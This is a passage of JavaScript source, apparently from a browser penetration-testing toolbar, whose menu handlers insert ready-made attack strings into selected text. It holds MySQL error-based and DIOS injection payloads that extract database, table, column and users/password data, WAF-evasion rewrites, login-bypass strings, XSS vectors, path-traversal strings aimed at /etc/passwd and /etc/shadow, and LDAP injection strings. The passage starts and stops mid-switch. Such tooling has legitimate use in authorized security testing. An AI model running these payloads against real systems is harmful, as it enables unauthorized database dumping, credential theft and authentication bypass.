                this.setSelectedText(replacementText);
            }
            break;
        case 'oracletosqlchar':
            payloadText = this.getSelectedText();
            if (payloadText !== false) {
                replacementText = SQL.selectionToSQLChar('oracle', payloadText);
                this.setSelectedText(replacementText);
            }
            break;
        //=========== SQL single

        case 'unionselect':
            payloadText = this.getSelectedText();
            if (payloadText !== false) {
                replacementText = SQL.selectionToUnionSelect(payloadText);
                this.setSelectedText(replacementText);
            }
            break;
        case 'spacestocomments':
            payloadText = this.getSelectedText();
            if (payloadText !== false) {
                replacementText = SQL.selectionToInlineComments('oracle', payloadText);
                this.setSelectedText(replacementText);
            }
            break;
        //=========== Error Based

        case 'errorbVersion':
            payloadText = " OR 1 GROUP BY CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2)) HAVING MIN(0) OR 1";
            this.setSelectedText(payloadText);
            break;
        case 'errorbDatabase':
            payloadText = " AND(SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(DATABASE() AS CHAR),0x7e)) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=DATABASE() LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)";
            this.setSelectedText(payloadText);
            break;
        case 'errorbTable':
            $('.ui.mini.modal').modal('show');
            banner.innerHTML = "Database Name or Use Default";
            inputText1.innerHTML = "Database Name";
            sboxBtn.setAttribute("name", "sltErrorTable");
            searchBox.defaultValue = 'DATABASE()';
            searchBox.value = searchBox.defaultValue;
            break;

        case 'sltErrorTable':

            var dbName = searchBox.value;
            var dbNameFinal = "0x";
            if (dbName == "DATABASE()") { dbNameFinal = "DATABASE()"; }
            else {
                for (var i = 0; i < dbName.length; i++) {
                    dbNameFinal += dbName.charCodeAt(i).toString(16);
                }
            }
            payloadText = " AND(SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(table_name AS CHAR),0x7e)) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=" + dbNameFinal + " LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)";
            this.setSelectedText(payloadText);
            $('.ui.mini.modal').modal('hide');
            break;

        case 'errorbColumns':
            $('.ui.mini.modal').modal('show');
            inputBox2.style.display = 'flex';
            banner.innerHTML = "Database Name & Table Name or Use Default";
            inputText1.innerHTML = "Database Name";
            inputText2.innerHTML = "Table Name";
            sboxBtn.setAttribute("name", "sltErrorColum");
            searchBox.defaultValue = 'DATABASE()';
            searchBox2.defaultValue = 'users';
            searchBox.value = searchBox.defaultValue;
            searchBox2.value = searchBox2.defaultValue;
            break;

        case 'sltErrorColum':
            var dbName = searchBox.value;
            var dbNameFinal = "0x";
            if (dbName == "DATABASE()") { dbNameFinal = "DATABASE()"; }
            else {
                for (var i = 0; i < dbName.length; i++) {
                    dbNameFinal += dbName.charCodeAt(i).toString(16);
                }
            }
            var tableName = searchBox2.value;
            var tblNameHexed = '';
            for (var i = 0; i < tableName.length; i++) {
                tblNameHexed += '' + tableName.charCodeAt(i).toString(16);
            }
            payloadText = " AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(column_name AS CHAR),0x7e)) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x" + tblNameHexed + " AND table_schema=" + dbNameFinal + " LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)";
            this.setSelectedText(payloadText);
            $('.ui.mini.modal').modal('hide');
            inputBox2.style.display = 'none';
            break;

        case 'errorbData':
            $('.ui.mini.modal').modal('show');
            inputBox2.style.display = 'flex';
            inputBox3.style.display = 'flex';
            banner.innerHTML = "Database , Table & Columns Name or Use Default";
            inputText1.innerHTML = "Database Name";
            inputText2.innerHTML = "Table Name";
            inputText3.innerHTML = "Column Name";
            sboxBtn.setAttribute("name", "sltErrorData");
            searchBox.defaultValue = 'DATABASE()';
            searchBox2.defaultValue = 'users';
            searchBox3.defaultValue = 'password';
            searchBox.value = searchBox.defaultValue;
            searchBox2.value = searchBox2.defaultValue;
            searchBox3.value = searchBox3.defaultValue;
            break;

        case 'sltErrorData':
            var databaseName = searchBox.value;
            var tableName = searchBox2.value;
            if (databaseName == "") { qualifiedTableName = tableName; }
            if (databaseName == "DATABASE()") { qualifiedTableName = tableName; }
            else {
                qualifiedTableName = databaseName + "." + tableName;
            }
            var columnName = searchBox3.value;
            payloadText = " AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(" + columnName + ") AS CHAR),0x7e)) FROM " + qualifiedTableName + " LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)";
            this.setSelectedText(payloadText);
            $('.ui.mini.modal').modal('hide');
            inputBox2.style.display = 'none';
            inputBox3.style.display = 'none';
            break;
        //=========== Polygon
        case 'polygonVersion':
            payloadText = " POLYGON((select*from(select*from(select concat(@@version)f)x))";
            this.setSelectedText(payloadText);
            break;
        case 'polygonTable':
            payloadText = " POLYGON((select*from(select*from(select group_concat(table_name separator 0x3c62723e) from information_schema.tables where table_schema=database())f)x))";
            this.setSelectedText(payloadText);
            break;
        //=========== Dios MultPoint

        case 'mpDios':
            payloadText = " multipoint((select*from (select x*1E308 from (select concat(@:=0,(select count(*) from information_schema.tables where table_schema=database() and@:=concat(@,0x0b,table_name)),@)x)y)j))";
            this.setSelectedText(payloadText);
            break;
        case 'mpDios1':
            payloadText = " multipoint((select*from(select(!x-~0) from(select concat(@:=0,(select(count(*))from(information_schema.tables)where(table_schema=database())and@:=concat(@,0x0b,table_name)),@)x)y)j))";
            this.setSelectedText(payloadText);
            break;
        case 'mpDios2':
            payloadText = "multipoint((select*from(select(x is not null)-9223372036854775808 from (select(concat(@:=0,(select count(*) from information_schema.tables where table_schema=database() and@:=concat(@,0x0b,table_name)),@))x)y)j))";
            this.setSelectedText(payloadText);
            break;
        case 'mpDios3':
            payloadText = "' and multipoint((select*from(select!x-~0.from(select(select group_concat(table_name separator 0x0b)from(select table_name from information_schema.tables where table_schema=database() limit 1,20)c)x)j)h))";
            this.setSelectedText(payloadText);
            break;
        //=========== Advanced Error

        case 'aderrorV':
            payloadText = "and(select!x-~0. from(select(select group_concat(Version()))x)x)";
            this.setSelectedText(payloadText);
            break;
        case 'aderrorT':
            payloadText = "and(select!x-~0. from(select(select group_concat(table_name separator 0x0b)from information_schema.tables where table_schema=database())x)x)";
            this.setSelectedText(payloadText);
            break;
        //=========== Madblood dios

        case 'mddios':
            payloadText = "(select x*1E308 from(select concat(@:=0,(select count(*)from information_schema.tables where table_schema=database()and@:=concat(@,0x0b,table_name)),@)x)y)";
            this.setSelectedText(payloadText);
            break;
        case 'mddios2':
            payloadText = "(select(x is not null)-9223372036854775808 from(select(concat(@:=0,(select count(*)from information_schema.tables where table_schema=database()and@:=concat(@,0x0b,table_name)),@))x)y)";
            this.setSelectedText(payloadText);
            break;
        case 'mddios3':
            payloadText = "(select!x-~0 from(select concat(@:=0,(select(count(*))from(information_schema.tables)where(table_schema=database())and@:=concat(@,0x0b,table_name)),@)x)y)";
            this.setSelectedText(payloadText);
            break;
        case 'mddios4':
            payloadText = "(select if(x,6,9)*1E308 from(select(select group_concat(table_name separator 0x0b)from information_schema.tables where table_schema=database())x)x)";
            this.setSelectedText(payloadText);
            break;
        case 'mddios5':
            payloadText = "(select!x-~0. from(select(select group_concat(table_name+separator 0x0b)from+information_schema.tables where table_schema=database())x)x)";
            this.setSelectedText(payloadText);
            break;
        case 'mddios6':
            payloadText = "(select(!root-~0)from(select concat/**/(user(),version(),database(),0x3c62723e,@:=0,(select count(*) from information_schema.columns where table_schema=database() and @:=concat/**/(@,table_name,0x3a3a3a3a3a,column_name,0x3c62723e)),@)root)z)";
            this.setSelectedText(payloadText);
            break;
        case 'mddios7':
            payloadText = "and(select(!root-~0)from(select concat/**/(user(),version(),database(),0x3c62723e,@:=0,(select+count(*) from information_schema.columns where table_schema=database() and @:=concat/**/(@,table_name,0x3a3a3a3a3a,column_name,0x3c62723e)),@)root)z)";
            this.setSelectedText(payloadText);
            break;
        case 'mddios8':
            payloadText = "and(select if(x,6,9)*1E308 from(select(select group_concat(table_name separator 0x0b)from+information_schema.tables where table_schema=database())x)x)";
            this.setSelectedText(payloadText);
            break;
        case 'mddios9':
            payloadText = "and(select x*1E308 from(select concat(@:=0,(select count(*)from information_schema.tables where table_schema=database() and@:=concat(@,0x0b,table_name)),@)x)y)";
            this.setSelectedText(payloadText);
            break;
        //============ 

        case 'dqbased':
            payloadText = " AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(CAST(VERSION() AS CHAR),0x7e)) FROM INFORMATION_SCHEMA.TABLES LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) AND 1=1";
            this.setSelectedText(payloadText);
            break;
        case 'dqbased2':
            payloadText = " AND(SELECT 1 from(SELECT COUNT(*),CONCAT((SELECT (SELECT (SELECT DISTINCT CONCAT(0x7e,0x27,CAST(schema_name AS CHAR),0x27,0x7e) FROM INFORMATION_SCHEMA.SCHEMATA WHERE table_schema!=DATABASE() LIMIT 1,1)) FROM INFORMATION_SCHEMA.TABLES LIMIT 0,1), FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) AND 1=1";
            this.setSelectedText(payloadText);
            break;
        case 'dqbased3':
            $('.ui.mini.modal').modal('show');
            banner.innerHTML = "Database Name or Use Default";
            inputText1.innerHTML = "Database Name";
            sboxBtn.setAttribute("name", "sltDqbased3");
            searchBox.defaultValue = 'DATABASE()';
            searchBox.value = searchBox.defaultValue;
            break;

        case 'sltDqbased3':
            var dbName = searchBox.value;
            var dbNameFinal = "0x";
            if (dbName == "DATABASE()") { dbNameFinal = "DATABASE()"; }
            else {
                for (var i = 0; i < dbName.length; i++) {
                    dbNameFinal += dbName.charCodeAt(i).toString(16);
                }
            }
            payloadText = " AND(SELECT 1from(SELECT COUNT(*),CONCAT((SELECT (SELECT (SELECT DISTINCT CONCAT(0x7e,0x27,CAST(table_name AS CHAR),0x27,0x7e) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=" + dbNameFinal + " LIMIT 0,1)) FROM INFORMATION_SCHEMA.TABLES LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) AND 1=1";
            this.setSelectedText(payloadText);
            $('.ui.mini.modal').modal('hide');
            break;

        case 'dqbased4':
            $('.ui.mini.modal').modal('show');
            inputBox2.style.display = 'flex';
            banner.innerHTML = "Database Name & Table Name or Use Default";
            inputText1.innerHTML = "Database Name";
            inputText2.innerHTML = "Table Name";
            sboxBtn.setAttribute("name", "sltDqbased4");
            searchBox.defaultValue = 'DATABASE()';
            searchBox2.defaultValue = 'users';
            searchBox.value = searchBox.defaultValue;
            searchBox2.value = searchBox2.defaultValue;
            break;

        case 'sltDqbased4':
            var dbName = searchBox.value;
            var dbNameFinal = "0x";
            if (dbName == "DATABASE()") { dbNameFinal = "DATABASE()"; }
            else {
                for (var i = 0; i < dbName.length; i++) {
                    dbNameFinal += dbName.charCodeAt(i).toString(16);
                }
            }
            var tblName = searchBox2.value;
            var tblNameHex = "";
            for (var i = 0; i < tblName.length; i++) {
                tblNameHex += tblName.charCodeAt(i).toString(16);
            }
            payloadText = " AND(SELECT 1 FROM(SELECTCOUNT(*),CONCAT((SELECT (SELECT (SELECT DISTINCT CONCAT(0x7e,0x27,CAST(column_name AS CHAR),0x27,0x7e) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema=" + dbNameFinal + " AND table_name=0x" + tblNameHex + " LIMIT 0,1)) FROM INFORMATION_SCHEMA.TABLES LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) AND 1=1";
            this.setSelectedText(payloadText);
            $('.ui.mini.modal').modal('hide');
            inputBox2.style.display = 'none';
            break;

        case 'dqbased5':
            $('.ui.mini.modal').modal('show');
            inputBox2.style.display = 'flex';
            inputBox3.style.display = 'flex';
            banner.innerHTML = "Database , Table & Columns Name or Use Default";
            inputText1.innerHTML = "Database Name";
            inputText2.innerHTML = "Table Name";
            inputText3.innerHTML = "Column Name";
            sboxBtn.setAttribute("name", "sltDqbased5");
            searchBox.defaultValue = 'DATABASE()';
            searchBox2.defaultValue = 'users';
            searchBox3.defaultValue = 'password';
            searchBox.value = searchBox.defaultValue;
            searchBox2.value = searchBox2.defaultValue;
            searchBox3.value = searchBox3.defaultValue;
            break;

        case 'sltDqbased5':
            var databaseName = searchBox.value;
            var tableName = searchBox2.value;
            if (databaseName == "") { qualifiedTableName = tableName; }
            if (databaseName == "DATABASE()") { qualifiedTableName = tableName; }
            else {
                qualifiedTableName = databaseName + "." + tableName;
            }
            var columnName = searchBox3.value;

            payloadText = " AND(SELECT 1 FROM(SELECT count(*),CONCAT((SELECT (SELECT (SELECT CONCAT(0x7e,0x27,cast(" + columnName + " AS CHAR),0x27,0x7e) FROM " + qualifiedTableName + " LIMIT+0,1)) FROM INFORMATION_SCHEMA.TABLES LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) AND 1=1";
            this.setSelectedText(payloadText);
            $('.ui.mini.modal').modal('hide');
            inputBox2.style.display = 'none';
            inputBox3.style.display = 'none';
            break;
        //============ Waf
        case 'waf1':
            var payloadText = this.getSelectedText();
            payloadText = payloadText.replace(/ /g, "/**/");
            payloadText = ("/*!" + payloadText + "*/");
            this.setSelectedText(payloadText);
            break;
        case 'waf2':
            var payloadText = this.getSelectedText();
            payloadText = payloadText.replace(/ /g, "+");
            payloadText = ("/*!50000" + payloadText + "*/");
            this.setSelectedText(payloadText);
            break;
        case 'waf3':
            var payloadText = this.getSelectedText();
            payloadText = payloadText.replace(/ /g, "+");
            payloadText = ("/*!12345" + payloadText + "*/");
            this.setSelectedText(payloadText);
            break;
        case 'waf4':
            var payloadText = this.getSelectedText();
            payloadText = payloadText.replace(/ /g, "+");
            payloadText = ("/*!13337" + payloadText + "*/");
            this.setSelectedText(payloadText);
            break;
        //=========== xss
        case 'stringtocharcode':
            payloadText = this.getSelectedText();
            if (payloadText !== false) {
                replacementText = XSS.selectionToChar('stringFromCharCode', payloadText);
                this.setSelectedText(replacementText);
            }
            break;
        case 'stringtohtmlcharcode':
            payloadText = this.getSelectedText();
            if (payloadText !== false) {
                replacementText = XSS.selectionToChar('htmlChar', payloadText);
                this.setSelectedText(replacementText);
            }
            break;
        case 'xssalert':
            replacementText = 'alert(String.fromCharCode(88, 83, 83))';
            this.setSelectedText(replacementText);
            break;
        //=========== xss  payload

        case 'payload1':
            payloadText = "<script>alert(1);</script>";
            this.setSelectedText(payloadText);
            break;

        case 'payload2':
            payloadText = "<svg/onload=alert()>";
            this.setSelectedText(payloadText);
            break;
        case 'payload3': payloadText = '"><svg/onload=alert()>';
            this.setSelectedText(payloadText);
            break;

        case 'payload4': payloadText = "?><script>alert(?X?)</script>";
            this.setSelectedText(payloadText);
            break;

        case 'payload5': payloadText = "</ScrIpt><script>alert(1)</script>";
            this.setSelectedText(payloadText);
            break;

        case 'payload6': payloadText = '"><script>alert(1)</script>';
            this.setSelectedText(payloadText);
            break;

        case 'payload7': payloadText = '" onerror=alert(1) "';
            this.setSelectedText(payloadText);
            break;

        case 'payload8': payloadText = '" onerror=alert(1) x="';
            this.setSelectedText(payloadText);
            break;

        case 'payload9': payloadText = "-alert(1)-";
            this.setSelectedText(payloadText);
            break;

        case 'payload10': payloadText = "-prompt(1)-";
            this.setSelectedText(payloadText);
            break;

        case 'payload11': payloadText = '<SCRIPT>+alert("X");</SCRIPT>';
            this.setSelectedText(payloadText);
            break;

        case 'payload12': payloadText = '<svg><script>varmyvar="text&quot;;alert(1)//";</script></svg>';
            this.setSelectedText(payloadText);
            break;

        case 'payload13': payloadText = "'><x onload'=alert(1)";
            this.setSelectedText(payloadText);
            break;
        case 'payload14': payloadText = "alert(/XSS/);";
            this.setSelectedText(payloadText);
            break;

        case 'payload15': payloadText = "1;alert(/XSS/);";
            this.setSelectedText(payloadText);
            break;
        case 'payload16': payloadText = "1';alert(/XSS/);x='1";
            this.setSelectedText(payloadText);
            break;

        case 'payload17': payloadText = "this['alert'](1)";
            this.setSelectedText(payloadText);
            break;

        case 'payload18': payloadText = '"/alert(1)/"';
            this.setSelectedText(payloadText);
            break;
        case 'payload19': payloadText = '"|alert(1)|"';
            this.setSelectedText(payloadText);
            break;

        case 'payload20': payloadText = "&#x00027;; confirm(1); &#x00027;";
            this.setSelectedText(payloadText);
            break;
        //============ Lfi

        case 'lfi1':
            payloadText = "/etc/passwd";
            this.setSelectedText(payloadText);
            break;
        case 'lfi2':
            payloadText = "///etc/passwd";
            this.setSelectedText(payloadText);
            break;
        case 'lfi3':
            payloadText = "../../../../../../../../../../../../etc/passwd";
            this.setSelectedText(payloadText);
            break;
        case 'lfi4':
            payloadText = "/etc/passwd%00";
            this.setSelectedText(payloadText);
            break;
        case 'lfi5':
            payloadText = "../../../../../../../../../../../../etc/passwd%00";
            this.setSelectedText(payloadText);
            break;
        case 'lfi6':
            payloadText = "\\\etc\passwd";
            this.setSelectedText(payloadText);
            break;
        case 'lfi7':
            payloadText = "..\..\..\..\..\..\..\..\..\..\etc\passwd";
            this.setSelectedText(payloadText);
            break;
        case 'lfi8':
            payloadText = "\etc\passwd%00";
            this.setSelectedText(payloadText);
            break;
        case 'lfi9':
            payloadText = "..\..\..\..\..\..\..\..\..\..\etc\passwd%00";
            this.setSelectedText(payloadText);
            break;
        case 'lfi10':
            payloadText = "//etc/passwd";
            this.setSelectedText(payloadText);
            break;
        case 'lfi11':
            payloadText = "....//....//....//....//....//....//....//....//....//....//etc/passwd";
            this.setSelectedText(payloadText);
            break;
        case 'lfi12':
            payloadText = "//etc/passwd%00";
            this.setSelectedText(payloadText);
            break;
        case 'lfi13':
            payloadText = "....//....//....//....//....//....//....//....//....//....//etc/passwd%00";
            this.setSelectedText(payloadText);
            break;
        case 'lfi14':
            payloadText = "///etc/hosts";
            this.setSelectedText(payloadText);
            break;
        case 'lfi15':
            payloadText = "../../../../../../../../../../../../etc/hosts";
            this.setSelectedText(payloadText);
            break;
        case 'lfi16':
            payloadText = "/etc/hosts%00";
            this.setSelectedText(payloadText);
            break;
        case 'lfi17':
            payloadText = "../../../../../../../../../../../../etc/hosts%00";
            this.setSelectedText(payloadText);
            break;
        case 'lfi18':
            payloadText = "///etc/shadow";
            this.setSelectedText(payloadText);
            break;
        case 'lfi19':
            payloadText = "../../../../../../../../../../../../etc/shadow";
            this.setSelectedText(payloadText);
            break;
        case 'lfi20':
            payloadText = "/etc/shadow%00";
            this.setSelectedText(payloadText);
            break;
        case 'lfi21':
            payloadText = "../../../../../../../../../../../../etc/shadow%00";
            this.setSelectedText(payloadText);
            break;
        case 'lfi22':
            payloadText = "..\%20\..\%20\..\%20\../etc/passwd%00";
            this.setSelectedText(payloadText);
            break;
        case 'lfi23':
            payloadText = "....//....//....//....//....//....//....//....//....//....//etc/hosts";
            this.setSelectedText(payloadText);
            break;
        case 'lfi24':
            payloadText = "....//....//....//....//....//....//....//....//....//....//etc/hosts%00";
            this.setSelectedText(payloadText);
            break;
        case 'lfi25':
            payloadText = "\etc\group%00";
            this.setSelectedText(payloadText);
            break;
        case 'lfi26':
            payloadText = "..\..\..\..\..\..\..\..\..\..\etc\group%00";
            this.setSelectedText(payloadText);
            break;
        case 'lfi27':
            payloadText = "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00";
            this.setSelectedText(payloadText);
            break;
        case 'lfi28':
            payloadText = "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/group%00";
            this.setSelectedText(payloadText);
            break;
        case 'lfi29':
            payloadText = "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00";
            this.setSelectedText(payloadText);
            break;
        case 'lfi30':
            payloadText = "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd%00";
            this.setSelectedText(payloadText);
            break;
        //===========  passcode

        case 'pass':
            payloadText = "or 'x'='x";
            this.setSelectedText(payloadText);
            break;
        case 'pass1':
            payloadText = "'or'1='1";
            this.setSelectedText(payloadText);
            break;
        case 'pass2':
            payloadText = "' or '1'='1";
            this.setSelectedText(payloadText);
            break;
        case 'pass3':
            payloadText = "' or 'x'='x";
            this.setSelectedText(payloadText);
            break;
        case 'pass4':
            payloadText = "1'or'1'='1";
            this.setSelectedText(payloadText);
            break;
        case 'pass5':
            payloadText = "' or 0=0 --";
            this.setSelectedText(payloadText);
            break;
        case 'pass6':
            payloadText = "or 0=0--";
            this.setSelectedText(payloadText);
            break;
        case 'pass7':
            payloadText = "or 0=0 #";
            this.setSelectedText(payloadText);
            break;
        case 'pass8':
            payloadText = "') or ('x'='x";
            this.setSelectedText(payloadText);
            break;
        case 'pass9':
            payloadText = "' or a=a-- ";
            this.setSelectedText(payloadText);
            break;
        case 'pass10':
            payloadText = "hi') or ('a'='a";
            this.setSelectedText(payloadText);
            break;
        case 'pass11':
            payloadText = "') or ('x')=('x";
            this.setSelectedText(payloadText);
            break;
        case 'pass12':
            payloadText = "or 1=1#";
            this.setSelectedText(payloadText);
            break;
        case 'pass13':
            payloadText = "admin' or '1'='1'#";
            this.setSelectedText(payloadText);
            break;
        case 'pass14':
            payloadText = "admin' or '1'='1 ";
            this.setSelectedText(payloadText);
            break;
        case 'pass15':
            payloadText = "admin') or ('1'='1'/*";
            this.setSelectedText(payloadText);
            break;
        case 'pass16':
            payloadText = "') or true--";
            this.setSelectedText(payloadText);
            break;
        case 'pass17':
            payloadText = "admin' or 1=1#";
            this.setSelectedText(payloadText);
            break;
        case 'pass18':
            payloadText = "admin') or '1'='1'--";
            this.setSelectedText(payloadText);
            break;
        //========== others

        case 'addslashes':
            payloadText = this.getSelectedText();
            if (payloadText !== false) {
                replacementText = MISC.addSlashes(payloadText);
                this.setSelectedText(replacementText);
            }
            break;
        case 'stripslashes':
            payloadText = this.getSelectedText();
            if (payloadText !== false) {
                replacementText = MISC.stripSlashes(payloadText);
                this.setSelectedText(replacementText);
            }
            break;
        case 'stripspaces':
            payloadText = this.getSelectedText();
            if (payloadText !== false) {
                replacementText = MISC.stripSpaces(payloadText);
                this.setSelectedText(replacementText);
            }
            break;
        //=========== plus
        case 'plus':
            payloadText = this.getSelectedText();
            if (payloadText !== false) {
                replacementText = String(parseInt(payloadText) + 1);
                this.setSelectedText(replacementText);
            }

            break;
        case 'minus':
            payloadText = this.getSelectedText();
            if (payloadText !== false) {
                replacementText = String(parseInt(payloadText) - 1);
                this.setSelectedText(replacementText);
            }
            break;
        //========= bypasser
        case 'dsub':
            payloadText = 'substring(database(),1,1)="a"';
            this.setSelectedText(payloadText);
            break;

        case 'dsub2':
            payloadText = "and sleep(10) and 1=1";
            this.setSelectedText(payloadText);
            break;

        case 'dsub3':
            payloadText = 'and sleep(10) and database()="xyz"';
            this.setSelectedText(payloadText);
            break;
        //========== waf order

        case 'waforderBy':
            payloadText = "/**/ORDER/**/BY/**/";
            this.setSelectedText(payloadText);
            break;
        case 'waforderBy2':
            payloadText = "/**/**/ORDER/**/BY/**/**/";
            this.setSelectedText(payloadText);
            break;
        case 'waforderBy3':
            payloadText = "/*!order*/+/*!by*/";
            this.setSelectedText(payloadText);
            break;
        case 'waforderBy4':
            payloadText = "/*!50000ORDER*//**//*!50000BY*/";
            this.setSelectedText(payloadText);
            break;
        //========== waf union

        case 'wafunion':
            payloadText = "%55nion(%53elect 1,2,3)";
            this.setSelectedText(payloadText);
            break;
        case 'wafunion2':
            payloadText = " union distinct select ";
            this.setSelectedText(payloadText);
            break;
        case 'wafunion3':
            payloadText = " union distinctROW select ";
            this.setSelectedText(payloadText);
            break;
        case 'wafunion4':
            payloadText = "  #?uNiOn   #?sEleCt";
            this.setSelectedText(payloadText);
            break;
        case 'wafunion5':
            payloadText = "  #?1q %0AuNiOn all#qa%0A#%0AsEleCt";
            this.setSelectedText(payloadText);
            break;
        case 'wafunion6':
            payloadText = "/*!%55NiOn*/ /*!%53eLEct*/";
            this.setSelectedText(payloadText);
            break;
        case 'wafunion7':
            payloadText = " un/**/ion+se/**/lect";
            this.setSelectedText(payloadText);
            break;
        case 'wafunion8':
            payloadText = "UNION/*&test=1*/SELECT/*&pwn=2*/";
            this.setSelectedText(payloadText);
            break;
        case 'wafunion9':
            payloadText = " ?UnI?On? 'SeL?ECT?";
            this.setSelectedText(payloadText);
            break;
        case 'wafunion10':
            payloadText = " (UnIoN) (SelECT) ";
            this.setSelectedText(payloadText);
            break;
        case 'wafunion11':
            payloadText = " (UnI)(oN) (SeL)(EcT)";
            this.setSelectedText(payloadText);
            break;
        case 'wafunion12':
            payloadText = "+UnIoN/*&a=*/SeLeCT/*&a=*/";
            this.setSelectedText(payloadText);
            break;
        case 'wafunion13':
            payloadText = " uni>on sel>ect ";
            this.setSelectedText(payloadText);
            break;
        //========== waf concat

        case 'wafconcat':
            payloadText = "CoNcAt()";
            this.setSelectedText(payloadText);
            break;
        case 'wafconcat2':
            payloadText = "CON%08CAT()";
            this.setSelectedText(payloadText);
            break;
        case 'wafconcat3':
            payloadText = "%0AcOnCat()";
            this.setSelectedText(payloadText);
            break;
        case 'wafconcat4':
            payloadText = "/**//*!12345cOnCat*/";
            this.setSelectedText(payloadText);
            break;
        case 'wafconcat5':
            payloadText = "/*!50000cOnCat*/(/*!*/)";
            this.setSelectedText(payloadText);
            break;
        //========== waf concat

        case 'wafnumber':
            payloadText = "+div+0";
            this.setSelectedText(payloadText);
            break;
        case 'wafnumber2':
            payloadText = "Having+1=0";
            this.setSelectedText(payloadText);
            break;
        case 'wafnumber3':
            payloadText = "+/*!and*/+1=0";
            this.setSelectedText(payloadText);
            break;
        case 'wafnumber4':
            payloadText = "and(1)=(0)";
            this.setSelectedText(payloadText);
            break;
        //========== waf shema

        case 'wafshema':
            payloadText = "/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=schEMA()-- -";
            this.setSelectedText(payloadText);
            break;
        case 'wafshema2':
            payloadText = "/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like schEMA()-- -";
            this.setSelectedText(payloadText);
            break;
        case 'wafshema3':
            payloadText = "/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=database()-- -";
            this.setSelectedText(payloadText);
            break;
        case 'wafshema4':
            payloadText = "/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like database()-- -";
            this.setSelectedText(payloadText);
            break;
        case 'wafshema5':
            payloadText = "/*!FrOm*/ %69nformation_schema./**/columns /*!50000Where*/ /*!%54able_name*/=hex table/*!FrOm*/ information_schema./**/columns /*!12345Where*/ /*!%54able_name*/ like hex table";
            this.setSelectedText(payloadText);
            break;
        //============ ldap

        case 'ldap1':
            payloadText = "*";
            this.setSelectedText(payloadText);
            break;
        case 'ldap2':
            payloadText = "*)(&";
            this.setSelectedText(payloadText);
            break;
        case 'ldap3':
            payloadText = "*))%26'";
            this.setSelectedText(payloadText);
            break;
        case 'ldap4':
            payloadText = "*()|&'";
            this.setSelectedText(payloadText);
            break;
        case 'ldap5':
            payloadText = "*(|(mail=*))";
            this.setSelectedText(payloadText);
            break;
        case 'ldap6':
            payloadText = "*(|(objectclass=*))";
            this.setSelectedText(payloadText);
            break;
        case 'ldap7':
            payloadText = "*)(uid=*))(|(uid=*";
            this.setSelectedText(payloadText);
            break;
        case 'ldap8':
            payloadText = "*/*";
            this.setSelectedText(payloadText);
            break;
        case 'ldap9':
            payloadText = "*|";
            this.setSelectedText(payloadText);
            break;
        case 'ldap10':
            payloadText = "//*";
            this.setSelectedText(payloadText);
            break;
        case 'ldap11':
            payloadText = "@*";
            this.setSelectedText(payloadText);
            break;
        case 'ldap12':
            payloadText = "admin*";
            this.setSelectedText(payloadText);
            break;
        case 'ldap13':
            payloadText = "admin*)((|userpassword=*)";
            this.setSelectedText(payloadText);
            break;
        case 'ldap14':
            payloadText = "x' or name()='username' or 'x'='y";
            this.setSelectedText(payloadText);
            break;
        case 'ldap15':
            payloadText = "%2A%28%7C%28mail%3D%2A%29%29";
            this.setSelectedText(payloadText);
            break;
        case 'ldap16':
            payloadText = "*(|(mail=*))";
            this.setSelectedText(payloadText);
            break;
        case 'ldap17':
            payloadText = "*(|(objectclass=*))";
            this.setSelectedText(payloadText);
            break;
        case 'ldap18':
            payloadText = "x' or name()='username' or 'x'='y";
            this.setSelectedText(payloadText);
            break;
        case 'ldap19':
            payloadText = "admin*)((|userpassword=*)";
            this.setSelectedText(payloadText);
            break;
        case 'ldap20':
            payloadText = "*)(uid=*))(|(uid=*";
            this.setSelectedText(payloadText);
            break;
        case 'ldap21':
            payloadText = "%2A%28%7C%28objectclass%3D%2A%29%29";
            this.setSelectedText(payloadText);
            break;
        case 'ldap22':
            payloadText = "%2A%7C";
            this.setSelectedText(payloadText);
            break;
        case 'ldap23':
            payloadText = "%7C";
            this.setSelectedText(payloadText);
            break;
        //============ variable

        case 'variable1':
            payloadText = "@@VERSION";
            this.setSelectedText(payloadText);
            break;
        case 'variable2':
